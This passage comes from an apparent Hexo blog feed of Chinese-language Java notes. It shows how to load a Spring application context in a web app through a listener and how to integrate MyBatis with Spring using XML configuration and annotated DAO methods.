<li>使用注解<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextLoadListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>③ 修改<code>Servlert</code>中<code>ApplicationContext</code>对象的获取方式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> (ApplicationContext) servletContext.getAttribute(<span class="string">&quot;applicationContext&quot;</span>);</span><br><span class="line">	<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> app.getBean(UserService.class);</span><br><span class="line">	userService.save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-优化代码"><a href="#2-优化代码" class="headerlink" title="2. 优化代码"></a>2. 优化代码</h2><p><strong>上述代码仍然存在一点小问题</strong></p>
<ul>
<li><strong>问题一：</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154905.png"></p>
<blockquote>
<p><strong>解决：在配置文件处使用<code>&lt;context-param&gt;</code></strong></p>
</blockquote>
<p><strong>① 在web.xml配置全局初始化参数</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    全局初始化参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>② 更改监听器初始化处代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取 ServletContext 对象</span></span><br><span class="line">	<span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletContextEvent.getServletContext();</span><br><span class="line">	<span class="comment">// 获取路径</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> servletContext.getInitParameter(<span class="string">&quot;contextConfigLocation&quot;</span>);</span><br><span class="line">	<span class="comment">// 加载Spring核心配置文件，获取 ApplicationContext 对象</span></span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(path);</span><br><span class="line">	<span class="comment">// 将 应用上下文对象存放在 ServletContext域</span></span><br><span class="line">	servletContext.setAttribute(<span class="string">&quot;applicationContext&quot;</span>, app);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>问题2：</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154905.png"></p>
<blockquote>
<p><strong>解决：封装工具类</strong></p>
</blockquote>
<p><strong>① 新建工具类<code>ApplicationContextUtil</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebApplicationContextUtils</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApplicationContext <span class="title function_">getApplicationContext</span><span class="params">(ServletContext servletContext)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (ApplicationContext) servletContext.getAttribute(<span class="string">&quot;applicationContext&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 修改<code>Servlert</code>中<code>ApplicationContext</code>对象的获取方式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">	<span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> WebApplicationContextUtils.getApplicationContext(servletContext);</span><br><span class="line">	<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> app.getBean(UserService.class);</span><br><span class="line">	userService.save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、使用Spring提供的应用上下文获取工具"><a href="#四、使用Spring提供的应用上下文获取工具" class="headerlink" title="四、使用Spring提供的应用上下文获取工具"></a>四、使用Spring提供的应用上下文获取工具</h1><p><strong>上面的监听器可以不用手动实现，Spring提供了一个监听器<code>ContextLoadListener</code>就是对上述功能的封装，该监听器内部加载Spring配置文件，创建应用上下文对象，并存储到ServletContext域中，提供了一个客户端工具<code>WebApplicationContextUtils</code>供使用者获得应用上下文对象。</strong></p>
<h2 id="1-使用步骤"><a href="#1-使用步骤" class="headerlink" title="1. 使用步骤"></a>1. 使用步骤</h2><p><strong>① 导入Spring集成web的坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   Spring集成web|     --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 在web.xml修改相关配置</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    全局初始化参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;listener&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;listener-class&gt;com.tyt.listener.ContextLoadListener&lt;/listener-class&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/listener&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    将路径改为 Spring 提供的监听器路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>③ 修改<code>Servlert</code>中<code>ApplicationContext</code>对象的获取方式</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(servletContext);</span><br><span class="line">	<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> app.getBean(UserService.class);</span><br><span class="line">	userService.save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring整合Mybatis</title>
    <url>/posts/2606c6a9.html</url>
    <content><![CDATA[<h1 id="一、案例引入"><a href="#一、案例引入" class="headerlink" title="一、案例引入"></a>一、案例引入</h1><p>现在，我们直接按原生方式使用 <a href="https://blog.csdn.net/qq_51938362/article/details/125677533?spm=1001.2014.3001.5501">MyBatis</a> 。</p>
<p><strong>自定义一个Dao层，使用Mybatis的注解开发</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AccountDao</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into tbl_account(name, money) values (#&#123;name&#125;, #&#123;money&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(Account account)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete(&quot;delete from tbl_account where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update(&quot;update tbl_account set name = #&#123;name&#125;, money = #&#123;money&#125; where id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Account account)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from tbl_account&quot;)</span></span><br><span class="line">    List&lt;Account&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from tbl_account where id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    Account <span class="title function_">findById</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	<span class="comment">// 1. 创建SqlSessionFactoryBuilder 对象</span></span><br><span class="line">	<span class="type">SqlSessionFactoryBuilder</span> <span class="variable">sqlSessionFactoryBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>();</span><br><span class="line">	<span class="comment">// 2. 加载xml配置文件</span></span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">	<span class="comment">// 3.创建 SqlsessionFactory对象</span></span><br><span class="line">	<span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> sqlSessionFactoryBuilder.build(inputStream);</span><br><span class="line">	<span class="comment">// 4.获取SqlSession对象</span></span><br><span class="line">	<span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">	<span class="comment">// 5.执行sqlSession对象执行查询，获取结果User</span></span><br><span class="line">	<span class="type">AccountDao</span> <span class="variable">accountDao</span> <span class="operator">=</span> sqlSession.getMapper(AccountDao.class);</span><br><span class="line">	<span class="type">Account</span> <span class="variable">account</span> <span class="operator">=</span> accountDao.findById(<span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">	System.out.println(account);</span><br><span class="line">	<span class="comment">// 6.释放资源</span></span><br><span class="line">	sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、整合思想"><a href="#二、整合思想" class="headerlink" title="二、整合思想"></a>二、整合思想</h1><blockquote>
<ul>
<li>将Mybatis中的实例交给Spring管理，Spring通过单例方式来管理<code>SqlSessionFactory</code>。</li>
<li>Mybatis中SqlSessionFactory的创建是通过SqlSessionFactoryBuilder来创建实例化，在Mybatis和Spring的整合后，通过<code>SqlSessionFactoryBean</code>来替代，SqlSessionFactoryBean必须给定一个属性<code>dataSource</code>。</li>
<li>给定一个属性<code>configLocation</code>，用来指定Mybatis的xml核心配置文件。</li>
</ul>
</blockquote>
<p><strong>对于mybatis执行sql语句，需要用到的对象有：</strong></p>
<ul>
<li><code>SqlSessionFactory</code>对象：只有创建了SqlSessionFactory对象，才能调用openSession()方法得到SqlSession对象。</li>
<li><code>dao</code>接口的代理对象：例如AccountDao接口，需要的代理对象为：SqlSeesion.getMapper(AccountDao.class)。</li>
<li>数据源<code>DataSource</code>对象：使用一个更强大、功能更多的连接池对象代替Mybatis自己的PooledDataSource。</li>
</ul>
<h1 id="三、整合步骤"><a href="#三、整合步骤" class="headerlink" title="三、整合步骤"></a>三、整合步骤</h1><p><strong>整个项目结构如下：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155055.png"></p>
<h2 id="1-引入依赖"><a href="#1-引入依赖" class="headerlink" title="1. 引入依赖"></a>1. 引入依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--mysql 依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        Spring 整合 Mybatis 所用坐标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Spring 整合 Mybatis 所用坐标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="2-两种Spring的开发方式整合"><a href="#2-两种Spring的开发方式整合" class="headerlink" title="2.两种Spring的开发方式整合"></a>2.两种Spring的开发方式整合</h2><ul>
<li>jdbc.properties，关于数据库的连接信息</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/test?characterEncoding=utf8</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=****</span><br></pre></td></tr></table></figure>

<h3 id="1-基于xml配置文件整合"><a href="#1-基于xml配置文件整合" class="headerlink" title="1.基于xml配置文件整合"></a>1.基于xml配置文件整合</h3><h4 id="①-Mybatis核心配置文件的编写"><a href="#①-Mybatis核心配置文件的编写" class="headerlink" title="① Mybatis核心配置文件的编写"></a>① Mybatis核心配置文件的编写</h4><p><strong>创建<code>mybatis-config.xml</code></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&amp;lt;!&amp;ndash;    初始化类型别名&amp;ndash;&amp;gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;typeAliases&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;package name=&quot;com.tyt.domain&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/typeAliases&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--数据源   在spring整合后，放在 spring-jdbc.xml 配置文件中--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;environments default=&quot;development&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;environment id=&quot;development&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;transactionManager type=&quot;JDBC&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;dataSource type=&quot;POOLED&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                &amp;lt;!&amp;ndash;连接信息&amp;ndash;&amp;gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;/dataSource&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/environment&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/environments&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--mapper  在和spring整合后，放在 spring-jdbc.xml 配置文件中--&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--    &lt;mappers&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &amp;lt;!&amp;ndash;  mapper 代理方式 &amp;ndash;&amp;gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;package name=&quot;com.tyt.dao&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/mappers&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="②-数据源对象的创建"><a href="#②-数据源对象的创建" class="headerlink" title="② 数据源对象的创建"></a>② 数据源对象的创建</h4><p><strong><code>spring-jdbc.xml</code></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用context加载配置文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置数据源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.DriverManagerDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置连接数据库的核心配置4个参数--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置sqlSessionFactory--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--加载mybatis核心配置文件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mybatis-config.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="③-Spring核心配置文件"><a href="#③-Spring核心配置文件" class="headerlink" title="③ Spring核心配置文件"></a>③ Spring核心配置文件</h4><p><strong>创建<code>applicationContext.xml</code></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">            http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--加载 spring-jdbc.xml--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;spring-jdbc.xml&quot;</span>/&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;accountDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperFactoryBean&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--指定mapperInterface，映射文件所在文件夹--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapperInterface&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.tyt.dao.AccountDao&quot;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--指定SqlSessionFactory--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="④-测试代码"><a href="#④-测试代码" class="headerlink" title="④ 测试代码"></a>④ 测试代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">	<span class="type">AccountDao</span> <span class="variable">accountDao</span> <span class="operator">=</span> (AccountDao) app.getBean(<span class="string">&quot;accountDao&quot;</span>);</span><br><span class="line">	System.out.println(accountDao);</span><br><span class="line">	<span class="type">Account</span> <span class="variable">ac</span> <span class="operator">=</span> accountDao.findById(<span class="number">1</span>);</span><br><span class="line">	System.out.println(ac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

